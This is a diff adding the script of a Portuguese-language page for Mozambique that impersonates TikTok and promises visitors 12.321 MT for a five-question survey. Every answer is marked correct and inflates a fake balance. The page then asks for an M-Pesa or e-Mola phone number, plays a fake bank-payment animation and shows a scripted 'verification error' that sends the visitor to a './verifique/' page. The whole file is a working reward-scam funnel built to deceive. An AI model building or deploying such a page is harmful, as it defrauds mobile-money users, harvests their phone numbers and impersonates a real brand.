+// ══════════════════════════════════
+//  CONFIG
+// ══════════════════════════════════
+const BONUS_INICIAL  = 1200.00;
+const TOTAL_OBJETIVO = 12321.26;
+const CAMBIO_MZN = 62; // 1 USD = 62 MZN
+
+// Áudio para o popup de ganho
+const audioMoney = new Audio();
+audioMoney.src = "assets/money.mp3";
+audioMoney.volume = 0.6;
+
+function playMoneySound() {
+  try {
+    audioMoney.currentTime = 0;
+    audioMoney.play().catch(e => console.log("Audio play failed:", e));
+  } catch(e) { console.log("Audio error:", e); }
+}
+
+function gerarValores() {
+  let resto = +(TOTAL_OBJETIVO - BONUS_INICIAL).toFixed(2);
+  let vals = [];
+  for (let i = 0; i < 4; i++) {
+    let v = +(Math.random() * (2604 - 1736) + 1736).toFixed(2);
+    vals.push(v);
+    resto = +(resto - v).toFixed(2);
+  }
+  vals.push(+resto.toFixed(2));
+  return vals;
+}
+
+let valoresSorteados = gerarValores();
+
+const optionIcons = [
+  ["🎵","📺","🔴","⏩"],
+  ["🤣","💃","🧠","📱"],
+  ["🎤","🎧","🎬","🕺"],
+  ["⭐","🔥","💥","🌟"],
+  ["💰","🎁","🏆","💎"]
+];
+
+const letras = ["A","B","C","D"];
+
+// Perguntas sobre TikTok
+const perguntas = [
+  {
+    titulo: "PERGUNTA 1",
+    texto: "Com que frequência você abre o TikTok por dia?",
+    opcoes: ["Mais de 5 vezes por dia", "2 a 4 vezes por dia", "Uma vez por dia", "Raramente ou nunca"]
+  },
+  {
+    titulo: "PERGUNTA 2",
+    texto: "Qual tipo de conteúdo você mais curte no TikTok?",
+    opcoes: ["Vídeos engraçados e humor", "Danças e desafios virais", "Tutoriais e dicas úteis", "Lives e transmissões ao vivo"]
+  },
+  {
+    titulo: "PERGUNTA 3",
+    texto: "Você já criou ou postou algum vídeo no TikTok?",
+    opcoes: ["Sim, posto com frequência", "Sim, mas raramente", "Nunca postei, só assisto", "Não tenho conta no TikTok"]
+  },
+  {
+    titulo: "PERGUNTA 4",
+    texto: "Quantos seguidores os seus criadores favoritos do TikTok têm?",
+    opcoes: ["Mais de 1 milhão", "Entre 100k e 1 milhão", "Menos de 100 mil", "Não sigo criadores específicos"]
+  },
+  {
+    titulo: "PERGUNTA 5",
+    texto: "Como você prefere interagir com vídeos no TikTok?",
+    opcoes: ["Dou like e partilho", "Deixo comentários", "Guardo nos favoritos", "Só assisto sem interagir"]
+  }
+];
+
+let etapa    = "landing";
+let indice   = 0;
+let respostas = [];
+let metodo   = "M-Pesa";
+let telefone = "";
+let isFollowing = false; // Estado do botão seguir
+
+function saldoAtual() {
+  let s = BONUS_INICIAL;
+  for (let i = 0; i < respostas.length; i++) s = +(s + valoresSorteados[i]).toFixed(2);
+  return s;
+}
+
+function fmt(n) {
+  return n.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ".") + " MT";
+}
+
+function fmtMZN(n) {
+  return n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",") + " MT";
+}
+
+function updateTopBar() {
+  const chip = document.getElementById("topChip");
+  const val  = document.getElementById("topVal");
+  if (etapa === "landing") { chip.style.display = "none"; return; }
+  chip.style.display = "flex";
+  const show = (etapa === "resultado" || etapa === "levantamento" || etapa === "erro") ? TOTAL_OBJETIVO : saldoAtual();
+  val.textContent = fmt(show);
+}
+
+// ══════════════════════════════════
+//  LANDING
+// ══════════════════════════════════
+function renderLanding() {
+  return `
+    <div class="page-animate">
+      <div class="u-bar">
+        <div class="u-avatar"></div>
+        <div>
+          <div class="u-name">TikTok</div>
+          <div class="u-tag">@tiktok · Patrocinado</div>
+        </div>
+        <button class="u-follow" id="followBtn">Seguir</button>
+      </div>
+
+      <div class="land-badge"><i class="fas fa-bell"></i> VOCÊ FOI SELECIONADO</div>
+      <div class="land-title">Ganhe <span class="hl">${fmt(TOTAL_OBJETIVO)}</span><br>agora mesmo!</div>
+      <div class="land-sub">Responda 5 perguntas rápidas sobre o TikTok e receba a sua recompensa em dólares direto no seu celular.</div>
+
+      <div class="stats-row">
+        <div class="stat-box">
+          <div class="stat-val r">5</div>
+          <div class="stat-lbl">Perguntas</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-val b">${fmt(TOTAL_OBJETIVO)}</div>
+          <div class="stat-lbl">Prêmio</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-val">30s</div>
+          <div class="stat-lbl">Duração</div>
+        </div>
+      </div>
+
+      <button class="cta-btn" id="startBtn">
+        <i class="fas fa-play"></i> COMEÇAR AGORA
+      </button>
+
+      <div class="land-footer">
+        Ao participar, você concorda com os Termos de Serviço.<br>
+        <a href="#">Política de Privacidade</a>
+      </div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  QUIZ
+// ══════════════════════════════════
+function renderQuiz() {
+  const p     = perguntas[indice];
+  const icons = optionIcons[indice];
+  const pct   = ((indice + 1) / perguntas.length) * 100;
+  const ganho = valoresSorteados[indice];
+
+  const opts = p.opcoes.map((txt, i) => `
+    <button class="opt-btn" data-ans="${txt.replace(/"/g,'&quot;')}">
+      <span class="opt-letter">${letras[i]}</span>
+      <span class="opt-emoji">${icons[i]}</span>
+      <span class="opt-txt">${txt}</span>
+    </button>
+  `).join("");
+
+  return `
+    <div class="page-animate">
+      <div class="u-bar">
+        <div class="u-avatar"></div>
+        <div>
+          <div class="u-name">TikTok</div>
+          <div class="u-tag">@tiktok · Patrocinado</div>
+        </div>
+        <button class="u-follow" id="followBtnQuiz">Seguir</button>
+      </div>
+
+
+
+      <div class="prog-wrap">
+        <div class="prog-top">
+          <span class="prog-lbl">Pergunta ${indice + 1} de 5</span>
+          <span class="prog-reward"><i class="fas fa-plus" style="font-size:9px;"></i> ${fmt(ganho)}</span>
+        </div>
+        <div class="prog-bar">
+          <div class="prog-fill" style="width:${pct}%"></div>
+        </div>
+      </div>
+
+      <div class="q-card">
+        <div class="q-tag"><i class="fab fa-tiktok" style="font-size:8px;"></i> ${p.titulo}</div>
+        <div class="q-text">${p.texto}</div>
+      </div>
+
+      <div class="opts">${opts}</div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  MODAL CENTRALIZADO (notificação de ganhos)
+// ══════════════════════════════════
+function renderModal(ganho, novoSaldo) {
+  return `
+    <div class="modal-center" id="popupModal">
+      <div class="modal-card">
+        <div class="modal-icon">
+          <i class="fas fa-check"></i>
+        </div>
+        <div class="modal-title">RESPOSTA CORRECTA!</div>
+        <div class="modal-amount">
+          +${fmt(ganho)}
+        </div>
+        <div class="modal-sub">adicionados ao seu saldo</div>
+        <div class="modal-balance-row">
+          <span class="label">Saldo total</span>
+          <span class="value">${fmt(novoSaldo)}</span>
+        </div>
+        <button class="modal-btn" id="continueModalBtn">
+          <i class="fas fa-arrow-right"></i> Continuar
+        </button>
+      </div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  PROCESSING
+// ══════════════════════════════════
+function renderProcessing() {
+  return `
+    <div class="page-animate proc-wrap">
+      <div class="proc-ring-outer">
+        <div class="proc-ring"></div>
+        <div class="proc-ring2"></div>
+        <div class="proc-center"></div>
+      </div>
+      <div class="proc-title">A processar...</div>
+      <div class="proc-sub">Por favor, aguarde um momento</div>
+      <div class="status-list">
+        <div class="st-item" id="s1"><div class="st-left"><i class="fas fa-search"></i><span>Verificando as suas respostas...</span></div><div class="st-right"></div></div>
+        <div class="st-item" id="s2"><div class="st-left"><i class="fas fa-check-circle"></i><span>Respostas validadas com sucesso!</span></div><div class="st-right"></div></div>
+        <div class="st-item" id="s3"><div class="st-left"><i class="fas fa-calculator"></i><span>Calculando o saldo acumulado...</span></div><div class="st-right"></div></div>
+        <div class="st-item" id="s4"><div class="st-left"><i class="fas fa-gift"></i><span>Recompensa confirmada!</span></div><div class="st-right"></div></div>
+      </div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  RESULT (com scroll garantido - botão visível)
+// ══════════════════════════════════
+function renderResultado() {
+  const total = TOTAL_OBJETIVO;
+  const rows  = valoresSorteados.map((v, i) =>
+    `<div class="detail-row"><span>Pergunta ${i+1}</span><span class="g">+${fmt(v)}</span></div>`
+  ).join("");
+
+  return `
+    <div class="page-animate tt-result">
+      <div class="result-hero">
+        <span class="trophy-wrap">🏆</span>
+        <div class="result-title">Parabéns! <span class="r">Você ganhou!</span></div>
+        <div class="result-sub">Completou todas as perguntas com sucesso!</div>
+      </div>
+
+      <div class="total-box">
+        <div class="total-lbl">SALDO DISPONÍVEL PARA LEVANTAMENTO</div>
+        <div class="total-val">${fmt(total)}</div>
+      </div>
+
+      <div class="detail-card">
+        <div class="detail-lbl"><i class="fas fa-chart-bar"></i> DETALHES DO SALDO</div>
+        <div class="detail-row"><span>Bónus inicial</span><span style="font-weight:800;">${fmt(BONUS_INICIAL)}</span></div>
+        ${rows}
+        <div class="detail-row tot"><span>Total</span><span class="r">${fmt(total)}</span></div>
+      </div>
+
+      <button class="btn-white" id="withdrawBtn">
+        <i class="fas fa-money-bill-wave"></i> LEVANTAR AGORA
+      </button>
+      <div class="small-note">⏰ Oferta expira em breve · Disponível por 24h</div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  WITHDRAW (com valor em Metical e imagens nos métodos)
+// ══════════════════════════════════
+function renderLevantamento() {
+  const total   = TOTAL_OBJETIVO;
+  const totalMZN = total * CAMBIO_MZN;
+  const isValid = telefone.length === 9 && /^\d+$/.test(telefone);
+  return `
+    <div class="page-animate">
+      <div class="u-bar">
+        <div class="u-avatar"></div>
+        <div>
+          <div class="u-name">Tiktok Moçambique</div>
+          <div class="u-tag">@tiktok_mz · Patrocinado</div>
+        </div>
+      </div>
+
+      <div class="wd-title">Levantar <span class="r">dinheiro</span></div>
+      <div class="wd-sub">Escolha o método e insira o número</div>
+
+      <div class="amt-box">
+        <div class="lbl">Valor a levantar</div>
+        <div class="val">${fmt(total)}</div>
+      </div>
+
+      <div class="sec-lbl"><i class="fas fa-credit-card"></i> MÉTODO DE PAGAMENTO</div>
+      <div class="method-grid">
+        <div class="method-card ${metodo==='M-Pesa'?'sel':''}" data-method="M-Pesa">
+          <img class="method-img" src="assets/mpesa.png" alt="M-Pesa" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fas fa-mobile-alt\' style=\'font-size: 32px;\'></i>'">
+          <div class="mn">M-Pesa</div>
+        </div>
+        <div class="method-card ${metodo==='e-Mola'?'sel':''}" data-method="e-Mola">
+          <img class="method-img" src="assets/emola.png" alt="e-Mola" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fas fa-university\' style=\'font-size: 32px;\'></i>'">
+          <div class="mn">e-Mola</div>
+        </div>
+      </div>
+
+      <div class="sec-lbl"><i class="fas fa-phone-alt"></i> NÚMERO DE TELEMÓVEL</div>
+      <div class="inp-wrap">
+        <div class="prefix">+258</div>
+        <input type="tel" class="phone-inp" id="phoneInput" value="${telefone}" placeholder="8X XXX XXXX" maxlength="9" inputmode="numeric" />
+      </div>
+
+      <button class="pay-btn ${isValid?'on':''}" id="payBtn" ${!isValid?'disabled':''}>
+        <i class="fas fa-lock"></i> PROCESSAR PAGAMENTO
+      </button>
+      <div class="secure-note">🔒 Pagamento seguro e encriptado</div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  PAYMENT ANIMATION (antes do erro)
+// ══════════════════════════════════
+function showPayAnimation() {
+  const overlay = document.createElement("div");
+  overlay.className = "pay-anim-overlay";
+  overlay.id = "payAnim";
+  overlay.innerHTML = `
+    <div class="pay-anim-ring">
+      <div class="pa-inner"><i class="fas fa-lock"></i></div>
+    </div>
+    <div class="pay-anim-label" id="paLabel">Conectando ao servidor...</div>
+    <div class="pay-anim-steps">
+      <div class="pa-step" id="pa1"><span class="pa-icon">🔐</span> Criptografando dados...</div>
+      <div class="pa-step" id="pa2"><span class="pa-icon">🏦</span> Contactando o banco...</div>
+      <div class="pa-step" id="pa3"><span class="pa-icon">✅</span> Verificando conta...</div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+
+  const labels = ["Conectando ao servidor...", "Validando pagamento...", "A processar transferência..."];
+  const steps  = ["pa1","pa2","pa3"];
+  let li = 0;
+
+  const labelEl = document.getElementById("paLabel");
+
+  const intv = setInterval(() => {
+    li++;
+    if (li < labels.length && labelEl) labelEl.textContent = labels[li];
+  }, 900);
+
+  steps.forEach((id, i) => {
+    setTimeout(() => {
+      const el = document.getElementById(id);
+      if (el) { el.classList.add("show"); setTimeout(() => el.classList.add("ok"), 300); }
+    }, 500 + i * 800);
+  });
+
+  setTimeout(() => {
+    clearInterval(intv);
+    overlay.remove();
+    etapa = "erro";
+    render();
+  }, 3400);
+}
+
+// ══════════════════════════════════
+//  ERROR
+// ══════════════════════════════════
+function renderErro() {
+  return `
+    <div class="page-animate">
+      <div class="err-icon"><i class="fas fa-exclamation-triangle"></i></div>
+      <div class="err-title">Erro no processamento</div>
+      <div class="err-sub">Ocorreu um problema ao processar o seu saque. O seu saldo está seguro.</div>
+
+      <div class="alert-box">
+        <i class="fas fa-shield-alt"></i>
+        <div>
+          <div class="alert-title">Erro de verificação</div>
+          <div class="alert-text">A sua conta precisa ser verificada antes de receber pagamentos. Assista ao vídeo abaixo para desbloquear o saque.</div>
+        </div>
+      </div>
+
+      <div class="vid-unlock">
+        <div class="vid-badge"><i class="fas fa-video"></i> PARA DESBLOQUEAR O SAQUE:</div>
+        <div class="vid-title">Assista ao vídeo de verificação</div>
+        <div class="vid-feats">
+          <span><i class="fas fa-clock"></i> 30 segundos</span>
+          <span><i class="fas fa-unlock-alt"></i> Desbloqueio imediato</span>
+        </div>
+        <a href="./verifique/" class="vid-btn">
+          <i class="fas fa-play"></i> ASSISTIR VÍDEO <i class="fas fa-arrow-right"></i>
+        </a>
+      </div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════
+//  PROCESSING ANIMATION
+// ══════════════════════════════════
+function iniciarProcessamento() {
+  const activate = (id, cls, delay) => {
+    setTimeout(() => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.classList.add(cls);
+      const r = el.querySelector(".st-right");
+      if (r) r.innerHTML = cls === "ok"
+        ? "<i class='fas fa-check' style='color:var(--tt-blue)'></i>"
+        : "<i class='fas fa-sync-alt fa-spin' style='color:var(--tt-red)'></i>";
+    }, delay);
+  };
+  activate("s1","ok", 400);
+  activate("s2","ok", 1200);
+  activate("s3","running", 2000);
+  activate("s4","ok", 2800);
+  setTimeout(() => { etapa = "resultado"; render(); }, 3600);
+}
+
+// ══════════════════════════════════
+//  RENDER
+// ══════════════════════════════════
+let isRendering = false;
+
+function render() {
+  if (isRendering) return;
+  isRendering = true;
+
+  const app = document.getElementById("app");
+  updateTopBar();
+
+  // LANDING
+  if (etapa === "landing") {
+    app.innerHTML = renderLanding();
+    
+    // Botão Seguir funcional
+    const followBtn = document.getElementById("followBtn");
+    if (followBtn) {
+      followBtn.textContent = isFollowing ? "Seguindo" : "Seguir";
+      if (isFollowing) followBtn.classList.add("following");
+      followBtn.onclick = () => {
+        isFollowing = !isFollowing;
+        followBtn.textContent = isFollowing ? "Seguindo" : "Seguir";
+        if (isFollowing) {
+          followBtn.classList.add("following");
+        } else {
+          followBtn.classList.remove("following");
+        }
+      };
+    }
+    
+    document.getElementById("startBtn").onclick = () => { etapa = "quiz"; render(); };
+    isRendering = false; return;
+  }
+
+  // QUIZ
+  if (etapa === "quiz") {
+    app.innerHTML = renderQuiz();
+    
+    // Botão Seguir funcional no quiz
+    const followBtnQuiz = document.getElementById("followBtnQuiz");
+    if (followBtnQuiz) {
+      followBtnQuiz.textContent = isFollowing ? "Seguindo" : "Seguir";
+      if (isFollowing) followBtnQuiz.classList.add("following");
+      followBtnQuiz.onclick = () => {
+        isFollowing = !isFollowing;
+        followBtnQuiz.textContent = isFollowing ? "Seguindo" : "Seguir";
+        if (isFollowing) {
+          followBtnQuiz.classList.add("following");
+        } else {
+          followBtnQuiz.classList.remove("following");
+        }
+      };
+    }
+    
+    document.querySelectorAll(".opt-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        const ganho     = valoresSorteados[indice];
+        respostas.push(btn.dataset.ans);
+        const novoSaldo = saldoAtual();
+        updateTopBar();
+
+        // Tocar som de moeda
+        playMoneySound();
+
+        // Mostrar modal centralizado
+        document.body.insertAdjacentHTML("beforeend", renderModal(ganho, novoSaldo));
+
+        document.getElementById("continueModalBtn").onclick = () => {
+          document.getElementById("popupModal").remove();
+          if (indice < perguntas.length - 1) {
+            indice++;
+            render();
+          } else {
+            etapa = "processing";
+            render();
+            iniciarProcessamento();
+          }
+        };
+      });
+    });
+    isRendering = false; return;
+  }
+
+  // PROCESSING
+  if (etapa === "processing") {
+    app.innerHTML = renderProcessing();
+    isRendering = false; return;
+  }
+
+  // RESULT
+  if (etapa === "resultado") {
+    app.innerHTML = renderResultado();
+    updateTopBar();
+    document.getElementById("withdrawBtn").onclick = () => { etapa = "levantamento"; render(); };
+    isRendering = false; return;
+  }
+
+  // WITHDRAW
+  if (etapa === "levantamento") {
+    app.innerHTML = renderLevantamento();
+
+    document.querySelectorAll(".method-card").forEach(m => {
+      m.onclick = () => {
+        metodo = m.dataset.method;
+        document.querySelectorAll(".method-card").forEach(x => x.classList.remove("sel"));
+        m.classList.add("sel");
+      };
+    });
+
+    const inp = document.getElementById("phoneInput");
+    if (inp) {
+      inp.addEventListener("input", e => {
+        telefone = e.target.value.replace(/\D/g,"").slice(0,9);
+        e.target.value = telefone;
+        const btn   = document.getElementById("payBtn");
+        const valid = telefone.length === 9;
+        if (btn) { btn.classList.toggle("on", valid); btn.disabled = !valid; }
+      });
+    }
+
+    const payBtn = document.getElementById("payBtn");
+    if (payBtn) {
+      payBtn.onclick = () => {
+        if (telefone.length === 9) showPayAnimation();
+      };
+    }
+
+    isRendering = false; return;
+  }
+
+  // ERROR
+  if (etapa === "erro") {
+    app.innerHTML = renderErro();
+    isRendering = false; return;
+  }
+
+  isRendering = false;
+}
+
+render();
+</script>
+</body>
+</html>
